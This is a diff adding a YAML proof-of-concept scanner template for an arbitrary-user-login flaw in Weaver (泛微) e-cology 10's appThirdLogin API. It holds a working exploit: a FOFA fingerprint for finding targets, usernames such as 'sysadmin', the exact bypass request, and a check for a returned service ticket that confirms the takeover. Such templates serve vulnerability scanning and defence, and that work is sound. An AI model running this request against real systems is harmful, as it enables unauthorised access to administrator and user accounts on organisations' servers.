@@ -1,0 +1,20 @@
+id: poc-yaml-weaver-e-cology-appthirdlogin-anyuser-login
+info:
+  name: 泛微 e-cology 10 appthirdlogin 任意用户登录漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: e-cology
+  fofa: icon_hash="-1619753057"
+variables:
+  user: '13661633641
+
+    sysadmin
+
+    '
+requests:
+- method: POST
+  path: /papi/passport/rest/appThirdLogin?username={{.user}}&service=1&ip=1&loginType=third
+  expression: status_code == 200 && contains(body,`"success":"true"`) && contains(body,`"serviceTicketId":`)
+    && contains(content_type,"application/json")
+transport: http
